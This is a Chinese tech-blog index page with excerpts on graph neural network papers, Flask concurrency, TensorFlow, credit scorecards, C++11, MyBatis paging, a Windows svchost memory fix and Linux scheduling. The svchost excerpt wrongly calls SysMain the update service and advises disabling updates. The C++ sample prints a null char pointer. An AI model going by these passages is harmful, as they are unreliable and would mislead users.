1.大多涉及到为每种类型的异构图设计元路径（meta-path），但是这种元路径需要手工定义，这不仅需要领域知识，同时降低了效率；2.或者假设不同类型的节点/边共享相同的特征和表示空间，这显然是不合适的；或者单独为不同节点类型或边类型保留各自单独的非共享权重，这忽略了异构图之间的交互性；3.大多忽略了每一个（异构）图的动态特性（个人觉得这一点和之前的两点不是在解决同一个问题，应该知只是为了丰富文章内容）；4.无法对Web规模的异构图进行建模。
为了处理异构图，文章的核心思想是将每条边的模型参数分解为三个矩阵相乘。其分解根据每条边的三元组 &lt;初始节点类型，边类型，目标节点类型&gt;来定义。这就是文中所提的元关系（meta-relation）。整体的计算参照transformer。以下图为例：
对于左图这样的异构图，可以定义出不同的元关系，每个meta-relation由三部分组成。文中提出相比于R-GCN，HGT的优势在于因为使用了三部分来定义元关系，这使得模型对于出现频次较低的关系的学习能力更强（因为另外两部分出现的频次可能不低）。
整个模型的框架可以分为三部分：Heterogeneous Mutual Attention，Heterogeneous Message Passing 和 Target-Specific Aggregation。分别用来计算attention，传递信息，信息聚合。
第一部分 受transformer的启发，将目标节点映射为query，源节点映射为Key。
与传统Transformer不同的点在于：HGT中每个元关系都有一组不同的投影权重W，传统Transformer是所有单词使用同一组权重。
ATT-head表示第i个注意力头；K(s) 代表源节点s投影成的第i个Key向量；Q(t) 代表目标节点t投影成第i个Query向量；μ(·) 表示每个关系三元组的一般意义，作为对注意力自适应缩放；
Attention(·) 的操作主要是把h个 ATT-head 连接，得到每个节点对（s,t）的注意力向量；从本质上说，该操作就是对于每个目标节点t，从邻接节点N(t)收集的注意力向量，再进行一次softmax得到概率分布。
第二部分 与第一步类似，这一步也将元关系融入信息传递过程来缓解不同类型节点和边的分布差异。
第三部分 最后一部分依据前两部分的计算结果将表示更新。
文章的第二部分主要是提出相对时间编码（RTE）技术处理动态图。
传统的方法是为每个小时间片（time slot）构建图，但这种方法会丢失大量的不同时间片间的结构依赖信息。
因此，受Transformer的位置编码（position embedding）启发，作者提出RTE机制，建模异质图上的动态依赖关系。
主要思想就是将时间差的信息编码到表示中从而引入时间对表示的影响。这里有一点在于train的时候见过的时间差不能覆盖所有可能的时间差，所以作者引入以下偏置函数将时间差泛化到可见范围。
为了处理web规模的数据，设计了针对异构图的采样算法 HGSampling。它的主要思想是样本异构子图中不同类型的节点以相同的比例，并利用重要性采样降低采样中的信息损失。
本文在其之前举例的开放学术图谱上进行实验：
但是这里值得注意的是，在对各种entity进行embedding的初始化的时候，实际上添加了相当多的信息，例如对field、venue等节点，就采用了自己argue的metapath2vec模型来进行初始化，所以实验结果的有效性应该也与这种设定有较强的关系。以下是部分实验结果：
同时还给出了一个根据计算的attention自动构建的meta-path的样例：
OpenKG
OpenKG（中文开放知识图谱）旨在推动以中文为核心的知识图谱数据的开放、互联及众包，并促进知识图谱算法、工具及平台的开源开放。
点击阅读原文，进入 OpenKG 网站。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8ab747f8dd18ee2865774bcc99f42f9/" rel="bookmark">
			flask多进程多线程配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		flask.Flask.run接受**options转发给它的其他关键字参数（）werkzeug.serving.run_simple-其中两个参数是threaded（布尔值）和processes（您可以将其设置为大于1的数字以使werkzeug产生多个进程来处理请求）。
threaded默认True版本自Flask 1.0起，因此对于最新版本的Flask，默认情况下默认开发服务器将能够同时为多个客户端提供服务。对于较旧版本的Flask，您可以显式传递threaded=True以启用此行为。
例如，您可以
if name == ‘main’:
app.run(threaded=True)
以与旧Flask版本兼容的方式使用线程处理多个客户端，或者
if name == ‘main’:
app.run(threaded=False, processes=3)
告诉Werkzeug生成三个进程来处理传入的请求，或者只是
if name == ‘main’:
app.run()
如果您知道将使用Flask 1.0或更高版本，则可以使用线程来处理多个客户端。
话虽如此，Werkzeug的serving.run_simple包装了标准库的wsgiref软件包-该软件包包含WSGI的参考实现，而不是可用于生产的Web服务器。如果您要在生产环境中使用Flask（假设“生产环境”不是低流量的内部应用程序，并发用户不超过10个），请确保将其支撑在真实的Web服务器后面（请参阅Flask文档标题为“ 一些建议方法的部署选项）。
0x02 Flask开启自带的多线程或多进程 开启多线程： app.run(debug=debug, host='0.0.0.0', port=8082, threaded=True) 1 app.run(debug=debug, host='0.0.0.0', port=8082, threaded=True) 开启多进程 app.run(debug=debug, host='0.0.0.0', port=8082, processes=10) 1 app.run(debug=debug, host='0.0.0.0', port=8082, processes=10) 需要注意的是，多进程和多线程不可以同时开启，且需要关闭debug。下面再来看下请求结果 [Process 91295] [Thread 123145513381888] 2020-09-29 14:29:01 _internal.py _log[line:122] [Process 91295] [Thread 123145509175296] 2020-09-29 14:29:01 _internal.py _log[line:122] 1 2 [Process 91295] [Thread 123145513381888] 2020-09-29 14:29:01 _internal.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8ab747f8dd18ee2865774bcc99f42f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/516061d6b8b439e454e9f1e17fa53394/" rel="bookmark">
			Tensorflow是干什么的？Tensorflow的基础入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导读：谷歌大脑自2011年成立起开展了面向科学研究和谷歌产品开发的大规模深度学习应用研究，其早期工作即是TensorFlow的前身DistBelief 。DistBelief的功能是构建各尺度下的神经网络分布式学习和交互系统，也被称为"第一代机器学习系统" 。DistBelief在谷歌和Alphabet旗下其它公司的产品开发中被改进和广泛使用 。
这是小编的其他文章,希望对大家有所帮助,点击即可阅读
人工智能常用的十大算法 人工智能数学基础（一） 人工智能数学基础(二)
人工智能数学基础（三） 人工智能数学基础（四）
为了方便大家学习交流，我建了一个扣裙：966367816（学习交流）
另外我还整理了整整python人工智能学习笔记、课程视频、面试宝典一并可以无套路免费
分享给大家！扫描文末二维码加V免费咨询学习问题领取资料
定义 TensorFlow™是一个基于数据流编程(dataflow programming)的符号数学系统，被广泛应用于各类机器学习(machine learning)算法的编程实现，其前身是谷歌的神经网络算法库DistBelief 。
Tensorflow拥有多层级结构，可部署于各类服务器、PC终端和网页并支持GPU和TPU高性能数值计算，被广泛应用于谷歌内部的产品开发和各领域的科学研究 。
TensorFlow由谷歌人工智能团队谷歌大脑（Google Brain)开发和维护，拥有包括TensorFlow Hub、TensorFlow Lite、TensorFlow Research Cloud在内的多个项目以及各类应用程序接口(Application Programming Interface, API) 。自2015年11月9日起，TensorFlow依据阿帕奇授权协议(Apache 2.0 open source license)开放源代码。
安装和配置 语言与系统支持 TensorFlow支持多种客户端语言下的安装和运行。截至版本1.12.0，绑定完成并支持版本兼容运行的语言为C和Python，其它(试验性)绑定完成的语言为JavaScript 、C++ 、Java 、Go和Swift，依然处于开发阶段的包括C#、Haskell、Julia、Ruby、Rust和Scala。
1、 Python
TensorFlow提供Python语言下的四个不同版本:CPU版本(tensorflow)、包含GPU加速的版本(tensorflow-gpu)，以及它们的每日编译版本(tf-nightly、tf-nightly-gpu)。TensorFlow的Python版本支持Ubuntu 16.04、Windows 7、mac OS、10.12.6 Sierra、Raspbian 9.0及对应的更高版本，其中macOS版不包含GPU加速 。安装Python版TensorFlow可以使用模块管理工具pip/pip3 或anaconda 并在终端直接运行。
此外Python版TensorFlow也可以使用Docker安装 :
2、C
TensorFlow提供C语言下的API用于构建其它语言的API，支持x86-64下的Linux类系统和macOS 10.12.6 Sierra或其更高版本，macOS版不包含GPU加速 。安装过程如下 :
下载TensorFlow预编译的C文件到本地系统路径(通常为/usr/local/lib)并解压缩。
使用ldconfig编译链接
此外用户也可在其它路径解压文件并手动编译链接。
编译C接口时需确保本地的C编译器(例如gcc)能够访问TensorFlow库 。
3、配置GPU
TensorFlow支持在Linux和Window系统下使用统一计算架构(Compute Unified Device Architecture,CUDA )高于3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/516061d6b8b439e454e9f1e17fa53394/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c31988c903e2f8c19d25bf47fd0a83b/" rel="bookmark">
			「实战案例」基于Python语言开发的信用评分卡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		信用风险计量模型可以包括跟个人信用评级，企业信用评级和国家信用评级。人信用评级有一系列评级模型组成，常见是A卡（申请评分卡）、B卡（行为模型）、C卡（催收模型）和F卡（反欺诈模型）。 今天我们展示的是个人信用评级模型的开发过程，数据采用kaggle上知名的give me some credit数据集。
今天，给各位数据粉带来的是比较熟悉的一个经典数据挖掘应用案例——金融常见信用评分卡的开发解析。
基于Python语言开发信用评分卡
Part 1 学会信用评分卡，我都能干什么？
01、信用评分卡的应用场景 与信用评分卡挂钩的信用评级在全球金融领域有广泛应用。它涉及到公司管理，企业债发行，企业融资，企业上市，企业并购，个人炒股和购买公司债券等多个场景。
企业债发行
企业主体信用评级越高，意味着该企业抗风险能力、盈利能力越强，发债融资成本越低。作为企业董事会，管理者，决策者应该了解企业主要财务指标，了解自身企业评级。
企业发债时都需要评级。国内评级这块主要分为AAA、AA+、AA、AA-、A+。企业评级过低会限制某些工具的发行额度、交易场所可质押性等等
如果是评级太低，企业发行债券没人买。目前广大投资者的投资门槛是AA。
企业上市
企业上市融资时也需要信用评级。目前国内只有优质企业才能上市融资，上市牌照是很难拿的。如果财务指标和资质不达标，则不能上市。
企业并购
企业并购是企业之间的兼并和收购行为。如果收购方不能很好了解对方企业评级，买来的企业可能是包装过的垃圾企业。失败企业并购会让企业背上巨大债务负担。
个人炒股
个人炒股投资者如果不懂企业评级，也难以买到优质股，容易被人忽悠买到垃圾股。建议不会数据科学的人趁早离开股市和金融投资，否则可能欠下巨额债务。
如果个人通过学习机器学习模型，可以识别有价值企业，股票，债券，财富升值概率显著高于不懂模型的人。
本案我们主要聚焦的是【金融信贷】场景中的信用评分卡开发实施全过程。
评分卡模型建模流程
典型的信用评分卡模型如图1-1所示。信用风险评级模型的主要开发流程如下：
（1） 获取数据，包括申请贷款客户的数据。数据包括客户各个维度，包括年龄，性别，收入，职业，家人数量，住房情况，消费情况，债务等等。
（2） 数据预处理，主要工作包括数据清洗、缺失值处理、异常值处理、数据类型转换等等。我们需要把原始数据层层转化为可建模数据。
（3） EDA探索性数据分析和描述性统计，包括统计总体数据量大小，好坏客户占比，数据类型有哪些，变量缺失率，变量频率分析直方图可视化，箱形图可视化，变量相关性可视化等。
（4） 变量选择，通过统计学和机器学习的方法，筛选出对违约状态影响最显著的变量。常见变量选择方法很多，包括iv，feature importance，方差等等 。另外缺失率太高的变量也建议删除。无业务解释性变量且没有价值变量也建议删除。
（5） 模型开发，评分卡建模主要难点是woe分箱，分数拉伸，变量系数计算。其中woe分箱是评分卡中难点中难点，需要丰富统计学知识和业务经验。目前分箱算法多达50多种，没有统一金标准，一般是先机器自动分箱，然后再手动调整分箱，最后反复测试模型最后性能，择优选取最优分箱算法。
（6） 模型验证，核实模型的区分能力、预测能力、稳定性、排序能力等等，并形成模型评估报告，得出模型是否可以使用的结论。模型验证不是一次性完成，而是当建模后，模型上线前，模型上线后定期验证。模型开发和维护是一个循环周期，不是一次完成。
（7） 信用评分卡，根据逻辑回归的变量系数和WOE值来生成评分卡。评分卡方便业务解释，已使用几十年，非常稳定，深受金融行业喜爱。其方法就是将Logistic模型概率分转换为300-900分的标准评分的形式。
（8） 建立评分卡模型系统，根据信用评分卡方法，建立计算机自动信用化评分系统。美国传统产品FICO有类似功能，FICO底层语言是Java。目前流行Java，python或R多种语言构建评分卡自动化模型系统。
（9）模型监控，着时间推移，模型区分能力，例如ks,auc会逐步下降，模型稳定性也会发生偏移。我们需要专业模型监控团队，当监控到模型区分能力下降显著或模型稳定性发生较大偏移时，我们需要重新开发模型，迭代模型。模型监控团队应该每日按时邮件发送模型监控报表给相关团队，特别是开发团队和业务团队。
02、金融信贷基础概念 在进行项目实施开发前，对应用场景进行深入了解，是我们数据人的基本功。
信用风险
信贷业务，又称贷款业务，是商业银行等信贷机构最重要的资产业务和主要赢利手段。信贷机构通过放款收回本金和利息，扣除成本后获得利润。对有贷款需求的用户，信贷机构首先要对其未来的还款表现进行预测，然后将本金借贷给还款概率大的用户。但这种借贷关系，可能发生信贷机构（通常是银行）无法收回所欠本金和利息而导致现金流中断和回款成本增加的可能性风险，这就是信用风险，它是金融风险的主要类型。
信用评分
在信贷管理领域，关于客户信用风险的预测，目前使用最普遍的工具为信用评分卡，它源于20世纪的银行与信用卡中心。在最开始的审批过程中，用户的信用等级由银行聘用的专家进行主观评判。而随着数据分析工具的发展、量化手段的进步，各大银行机构逐渐使用统计模型将专家的评判标准转化为评分卡模型。如今，风险量化手段早已不局限于银行等传统借贷机构，持牌互联网公司的金融部门、持牌消费金融公司等均有成体系的风险量化手段。其应用的范围包括进件、贷后管理及催收等。信用评分不但可以筛选高风险客户，减少损失发生，也可以找出相对优质的客户群，发掘潜在商机。
顾名思义，评分卡是一张有分数刻度和相应阈值的表。对于任何一个用户，总能根据其信息找到对应的分数。将不同类别的分数进行汇总，就可以得到用户的总分数。信用评分卡，即专门用来评估用户信用的一张刻度表，这里我们举一个简单的例子：假设我们有一个评分卡，包含四个变量（特征），即居住条件、年龄、贷款目的和现址居住时长（见表2-1）
表2-1 简单评分卡
用表2-1这张简单的评分卡，我们能轻而易举地计算得分。一个47岁、租房、在当前住址住了10年、想借钱度假的申请者得到53分（20+17+16+0=53），另一个25岁、有自己的房产、在当前住址住了2年、想借钱买二手车的人也同样得到53分（5+30+9+9=53）。同样地，一个38岁、与父母同住、在当前住址住了18个月、想借钱装修的人也得到53分（15+20+4+14=53）。事实上，我们一共有七个组合可以得到53分，他们虽然各自情况都不一样，但对贷款机构来说代表了同样的风险水平。该评分系统采用了补偿机制，即借款人的缺点可以用优点去弥补。
总的来说，信用评分卡就是通过用数据对客户还款能力和还款意愿进行定量评估的系统。从20世纪发展至今，其种类已非常多，目前应用最广泛最多的主要分为以下四种：
申请评分卡（ApplicationCard）：申请评分卡通常用于贷前客户的进件审批。在没有历史平台表现的客群中，外部征信数据及用户的资产质量数据通常是影响客户申请评分的主要因素。行为评分卡（BehaviorCard）：行为评分卡用于贷中客户的升降额度管理，主要目的是预测客户的动态风险。由于客户在平台上已有历史数据，通常客户在该平台的历史表现对行为评分卡的影响最大。催收评分卡（CollectionCard）：催收评分卡一般用于贷后管理，主要使用催收记录作为数据进行建模。通过催收评分对用户制定不同的贷后管理策略，从而实现催收人员的合理配置。反欺诈评分卡（Anti-fraudCard）：反欺诈评分卡通常用于贷前新客户可能存在的欺诈行为的预测管理，适用于个人和机构融资主体。 其中前三种就是我们俗称的“ABC”卡。A卡一般可做贷款0-1年的信用分析；B卡则是在申请人一定行为后，有了较大消费行为数据后的分析，一般为3-5年；C卡则对数据要求更大，需加入催收后客户反应等属性数据。
四种评分卡中，最重要的就是申请评分卡，目的是把风险控制在贷前的状态；也就是减少交易对手未能履行约定契约中的义务而造成经济损失的风险。违约风险包括了个人违约、公司违约、主权违约，本案例只讲个人违约。
案例背景 发放贷款给合适的客户是银行收入的一大来源，在条件允许的范围内，银行希望贷出去的钱越多越好，贷款多意味着对应的收入也多，但是如果把钱贷给了信用不好的人或者企业，就会面临贷款收不回来的情况。
对于贷款申请的审批，传统人工审批除了受审批人员的专业度影响外，也会受到其主观影响，另一方面专业人员的培养通常也需要一个较长的周期。 而信用评分卡技术的变量、评分标准和权重都是给定的。同一笔业务，只要录入要素相同，就会给出一个参考结果。既提高了审批效率也减少了人为因素的干扰，如人工审批过程中的随意性和不一致性。确保了贷款审批标准的客观性、标准化和一致性；保证风险特征相近的贷款申请能够得到相似的审批结果，如审批通过与否、授信额度、利率水平等。
信用评分卡技术在20世纪50年代即广泛应用于消费信贷，尤其是在信用卡领域。随着信息技术的发展和数据的丰富，信用评分卡技术也被用于对小微企业贷款的评估，最初是拥有大量客户数据信息的大型银行。如富国银行1993年首先在小微企业贷款领域应用信用评分卡技术。随后，美国很多社区银行等中小银行也开始广泛应用小微企业信用评分系统。
现中国的某银行信用卡中心的贷款申请业务近期又增长了10%，原来的申请评分卡已出现数据偏移，监测到审批准确度有下降趋势。作为信用卡中心的风控建模分析师，小王接到风控总监下发的任务：基于近两年的历史数据（见“数据集介绍”的Train_data.csv），重新建立一张“申请评分卡”用于预测申请者未来是否会发生90天以上的逾期行为，以此来判断给哪些客户予以发放，哪些客户予以拒绝。
数据集介绍 训练数据：Train_data.csv。该数据即有特征X又有标签y，是小王用来建模的数据。预测数据：Predict_data.csv。该数据只有特征X没有标签y，为小王需要预测的数据。也即新进的申请信用卡的客户相关信息。 基于Python语言开发信用评分卡
Part 2 信用评分卡如何做数据准备工作
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c31988c903e2f8c19d25bf47fd0a83b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34572b72bd45c0bf2ed96b2d9777eb20/" rel="bookmark">
			Decoupled Sparial-Temporal Attention Network forSkeleton-Based Action Recognition
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Abstract 解决问题：以前的方法严重依赖于手工设计的遍历规则或图像拓扑结构来对关节之间的依赖关系建模。
方法：提出了一种新的解耦时空注意网络（DSTA-Net），允许对关节之间的时空依赖关系建模，无需知道位置以及相互连接关系。
具体来说，提出了三种注意力相关的模块：时空注意力解耦、解耦位置编码和空间全局正则化。
在数据方面，引入了骨骼数据解耦技术，以强调空间/时间和不同运动尺度的特定特征。
Introduction 骨骼数据优点：在少量数据中包含高级语义信息；对动态环境有很强的适应性。
骨骼数据的组成：一系列帧，每个帧包含一组点，每个点以2D/3D坐标表示一个人的关节。
常见的处理方式：将骨架数据依据遍历规则和拓扑结构转化为有意义的形式：点序列、伪图像…但手工设计的规则无法保证对关节的全局相关性建模了。
使用自我注意力机制的好处：
以计算复杂度小学习元素之间的全局相关性；不需要知道元素之间的内在关系，都可以自己学；人体关节数量小，自注意力机制额外成本也小。 将自注意力机制应用于骨骼数据的难点于解决方案：
原始的自注意力机制的输入是顺序数据，而骨骼数据存在于空间和时间维度；简单地将时空数据转化为单一序列是不可取的，本文将注意力机制分解为空间注意力和时间注意力；将骨骼送入网络时，没有预定义顺序或结构。因此，引入了位置编码，分为空间编码和时间编码；在先验知识基础上加入适当正则化，可以避免拟合；基于骨架关节特定的物理意义，提出空间全局正则化方法，迫使模型学习更多注意力；由于正则化不适用于时间维度，所以没有这样的语义对齐属性。 处理数据的技巧：
将每一个数据分为动作相关与动作无关部分。于是将数据分解为空间维度和时间维度。空间流至包含与运动无关的特征；时间流只包含与运动相关的特征。比如向上挥手和向下挥手，通过空间流数据确定手的形状，通过时间流数据确定挥动方向。对于时间流，分为短期动作与长期动作，因此需要有区别的对模型的处理方式进行区分，因此根据采样率分为了快流和慢流。低帧速率流捕获全局信息，高帧速率流关注细节信息。两个流融合提高性能。 Expriment 证明了位置编码在该任务中的重要性以及位置编码解码为时间属性和空间属性的必要性；证明了存在空间全局正则化的必要性以及不需要时间全局正则化；证明了单帧建模性能次于帧间建模词次于折衷建模。 策略1:仅对考虑帧中关节的依赖关系；
策略2:计算所有帧之间的两个关节的关系，这意味着同时考虑了两个关节的帧内关系和帧间关系；会引起过度拟合问题。
策略3: 只考虑相同帧中的关节来计算，但获得的所有帧的注意力map是平均的和共享的。
在注意力图像中有两点结论：
较低层次，更关注指尖和手腕的关系，因为这些关节对识别人类手势更具有辨识能力；在高层，信息高度聚合，每个关节之间的差异变得不明显。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ceef596054aff5187b0a6f9f2bcc25c3/" rel="bookmark">
			C&#43;&#43;11允许定义结构体时给成员赋初始值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在C++11之前，我们定义结构体时，只是声明了一个机构体的构成，并不能给其中的成员赋初始值。在使用的时候，先生成一个结构体对象，然后才能对其成员逐个赋值，这种方式肯定是我们不喜欢的。
在C++11之前，创建结构体只是开辟了一块内存空间，而不赋初始值，赋初始值有的编译器不支持的!
从C++11之后，编译器就支持在结构体的定义时进行成员初始化。
#include &lt;iostream&gt; using namespace std; struct st { char* name = nullptr; unsigned int age = 15; int number = 21509111; }; int main() { st ttt; cout &lt;&lt; ttt.name &lt;&lt; endl; ttt.age = 100; cout &lt;&lt; ttt.age &lt;&lt; endl; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9da377a4a9fb8debf34e99e6ee7d2060/" rel="bookmark">
			java中分页插件怎么使用方法_Mybatis分页插件PageHelper配置及使用方法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境
框架：spring+springmvc+mybatis pom.xml com.github.pagehelper pagehelper 5.1.2
配置全局配置文件
在mybatis的全局配置文件中配置PageHelper分页插件
/p&gt; PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt; 使用
例如：实现对用户的多条件查询
package com.szfore.model; import java.util.Date; import java.util.List; public class User { private Integer id; private String uname; private String pwd; private String name; private Integer sex; private String phone; private String company; private String jobtitle; private String birth; private Date createdate; private Date lastlogintime; private List roleList; public List getRoleList() { return roleList; } public void setRoleList(List roleList) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9da377a4a9fb8debf34e99e6ee7d2060/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a355b88404824b81eb0881d312683f0/" rel="bookmark">
			svchost.exe进程内存占用过高案例解决方案一例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现象：偶然一次进行常规内存清理的过程中，发现系统进程svchost.exe占用内存达到1.2G，严重挤占了系统资源。
系统环境：win7系统64位旗舰版
初步处理：使用Windows任务管理器定位服务，指向到AudioEndpointBuilder服务，尝试停止该服务，内存占用情况未能得到缓解。
分析：从未能缓解的情况来看，仍然存在系统服务启动的情况，有可能是其他关联的服务产生。
执行 tasklist -svc 命令列出如下表所示内容
映像名称 PID 服务
=============== ========== ==================
svchost.exe 220 RpcEptMapper, RpcSs
svchost.exe 612 AudioSrv, Dhcp, eventlog,
HomeGroupProvider, lmhosts, wscsvc
svchost.exe 1032 AudioEndpointBuilder, hidserv, Netman,
PcaSvc, SysMain, TrkWks, UxSms, Wlansvc
svchost.exe 1060 AeLookupSvc, BITS, Browser, EapHost,
IKEEXT, iphlpsvc, LanmanServer, MMCSS,
ProfSvc, RasMan, Schedule, SENS,
ShellHWDetection, Themes, Winmgmt, wuauserv
svchost.exe 1228 gpsvc
============================================
对照任务管理器中svchost.exe占用内存高的PID，发现除了AudioEndpointBuilder, 还有hidserv, Netman,PcaSvc, SysMain, TrkWks, UxSms, Wlansvc等多个服务，逐一关闭，发现关闭到SysMain时，内存占用高的情况解除。
经查SysMain是Win7中启动系统自动更新的服务，因此只需要关闭即可。可以在控制面板→系统和安全→Windows Update→启用或禁用自动更新→重要更新中选择“从不检查更新”即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1176450a4bfc133ebb85a5e1119267f7/" rel="bookmark">
			linux内核学习9：Linux的进程调度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是进程调度 出现背景：
无论是在批处理系统还是分时系统中，用户进程数一般都多于处理机数、这将导致它们互相争夺处理机。另外，系统进程也同样需要使用处理机。这就要求进程调度程序按一定的策略，动态地把处理机分配给处于就绪队列中的某一个进程，以使之执行。
进程调度，是确保进程能有效工作的一个内核子系统。
调度程序负责决定将哪些进程投入到运行，何时进行以及运行多长时间。
进程调度程序（通常简称为调度程序）可看成是可运行态进程之间分配有限的处理器时间资源的内核子系统。
进程调度是对TASK_RUNNING状态的进程进行调度， 如果进程不可执行(正在睡眠或其他)，那么它跟进程调度没多大关系。
我们说进程调度性能的衡量方法可分为定形和定量两种。在定形衡量方面，首先是调度的可靠性。包括一次进程调度是否可能引起数据结构的破坏等。这要求我们对调度时机的选择和保存CPU现场十分谨慎。另外，简洁性也是衡量进程调度的一个重要指标，由于调度程序的执行涉及到多个进程和必须进行上下文切换，如果调度程序过于繁琐和复杂，将会耗去较大的系统开销。这在用户进程调用系统调用较多的情况下，将会造成响应时间大幅度增加。
二、linux的上下文 参考：https://www.cnblogs.com/lambda107/archive/2010/08/10/1795767.html
2.1 内核态与用户态 （1）**当一个任务（进程）执行系统调用而陷入内核代码中执行时，称进程处于内核运行态（内核态）。**此时处理器处于特权级最高的（0级）内核代码中执行。当进程处于内核态时，执行的内核代码会使用当前进程的内核栈。每个进程都有自己的内核栈。
（2）**当进程在执行用户自己的代码时，则称其处于用户运行态（用户态）。**此时处理器在特权级最低的（3级）用户代码中运行。当正在执行用户程序而突然被中断程序中断时，此时用户程序也可以象征性地称为处于进程的内核态。因为中断处理程序将使用当前进程的内核栈。
上下文context： 上下文简单说来就是一个环境。
2.2 进程上下文 用户空间的应用程序，通过系统调用，进入内核空间。这个时候用户空间的进程要传递很多变量、参数的值给内核，内核态运行的时候也要保存用户进程的一些寄存 器值、变量等。所谓的“进程上下文”，可以看作是用户进程传递给内核的这些参数以及内核要保存的那一整套的变量和寄存器值和当时的环境等。
用户进程在执行系统调用，或者发生一个异常的时候，这时这个进程就进入了内核空间，这时候对内核来说就叫做进程上下文
进程上下文，一定是进行了系统调用或者异常执行，导致CPU从用户空间到内核空间了，简单理解点，可以把执行在用户空间的代码叫做进程上文，执行在内核空间的叫做进程下文
相对于进程而言，就是进程执行时的环境。具体来说就是各个变量和数据，包括所有的寄存器变量、进程打开的文件、内存信息等。一个进程的上下文可以分为三个部分:用户级上下文、寄存器上下文以及系统级上下文。
（1）用户级上下文: 正文、数据、用户堆栈以及共享存储区；
（2）寄存器上下文: 通用寄存器、程序寄存器(IP)、处理器状态寄存器(EFLAGS)、栈指针(ESP)；
（3）系统级上下文: 进程控制块task_struct、内存管理信息(mm_struct、vm_area_struct、pgd、pte)、内核栈。
当发生进程调度时，进行进程切换就是上下文切换(context switch).操作系统必须对上面提到的全部信息进行切换，新调度的进程才能运行。而系统调用进行的模式切换(mode switch)。模式切换与进程切换比较起来，容易很多，而且节省时间，因为模式切换最主要的任务只是切换进程寄存器上下文的切换。
2.3 中断上下文 硬件通过触发信号，导致内核调用中断处理程序，进入内核空间。这个过程中，硬件的 一些变量和参数也要传递给内核，内核通过这些参数进行中断处理。所谓的“ 中断上下文”，其实也可以看作就是硬件传递过来的这些参数和内核需要保存的一些其他环境（主要是当前被打断执行的进程环境）。中断时，内核不代表任何进程运行，它一般只访问系统空间，而不会访问进程空间，内核在中断上下文中执行时一般不会阻塞。
当内核在执行一个中断处理函数或者执行中断下半部时，这时候，内核是处在中断上下文
这里引入一个中断下半部，那就应该有中断上半部
中断上半部： 中断处理程序是上半部，它接收到一个中断，就立即执行，但只做有严格时限的工作
中断下半部： 主要做被允许能稍后完成的工作。
2.3 两者区别 进程上下文可以睡眠，也可以调用调度程序中断上下文不可以睡眠，不能使用信号量中断上半部应该快速，不执行耗时任务，应该交由中断处理例程下半部来处理因为中断上下文是和特定进程无关的，它是内核代表硬件运行在内核空间，所以在中断上下文无法访问用户空间的虚拟地址中断处理例程可以被更高级别的IRQ中断。如果想禁止这种中断，可以将中断处理例程定义成快速处理例程，相当于告诉CPU，该例程运行时，禁止本地CPU上所有中断请求。这直接导致的结果是，由于其他中断被延迟响应，系统性能下降。 三、linux的进程调度策略 策略决定调度程序在何时让什么进程运行。调度器的策略往往就决定系统的整体印象，并且还要负责优化使用处理器时间。
2.1 Linux进程调度分为三种策略 Linux进程调度分为三种策略
实时进程的调度策略是SCHED_FIFO和SCHED_RR，普通的，非实时进程的调度策略（分时调度策略）是SCHED_NORMAL（SCHED_OTHER）。
Linux进程调度分为三种策略
（1）SCHED_OTHER，分时调度策略
（2）SCHED_FIFO，实时调度策略，先到先服务
（3）SCHED_RR，实时调度策略，时间片轮转
实时调度策略被实时调度器管理，普通调度策略被完全公平调度器来管理。实时进程的优先级要高于普通进程（nice越小优先级越高）。
实时调度策略就是在指定的时间执行，由调度程序来设定开始结束时间， 普通调度策略是由内核调度器自己设定的，所以人为设定的实时进程优先级要高于普通进程。
两种实时调度策略的区别
SCHED_FIFO实现了一种简单的先入先出的调度算法，它不使用时间片，但支持抢占，只有优先级更高的SCHED_FIFO或者SCHED_RR进程才能抢占它，否则它会一直执行下去，低优先级的进程不能抢占它，直到它受阻塞或自己主动释放处理器。
SCHED_RR是带有时间片的一种实时轮流调度算法，当SCHED_RR进程耗尽它的时间片时，同一优先级的其它实时进程被轮流调度，时间片只用来重新调用同一优先级的进程，低优先级的进程决不能抢占SCHED_RR任务，即使它的时间片耗尽。SCHED_RR是带时间片的SCHED_FIFO。
2.2 Linux分时调度策略CFS SCHED_NORMAL（SCHED_OTHER）是默认的Linux分时调度（time-sharing scheduling）策略，它是Linux线程默认的调度策略。
